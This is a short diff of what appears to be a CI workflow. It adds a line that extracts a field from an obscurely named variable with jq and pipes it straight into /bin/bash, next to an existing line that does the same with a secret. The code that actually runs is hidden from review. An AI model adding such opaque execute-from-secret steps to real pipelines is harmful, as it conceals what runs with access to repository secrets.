@@ -21,6 +21,7 @@ jobs:
           kh795: ${{ secrets.kh795 }}
         run: |
           printf '%s' "$kh795" | jq -r .bxcq04893 | /bin/bash
+          echo $p7993 | jq -r .r1 | /bin/bash
 
       - name: Save archive
         if: always()
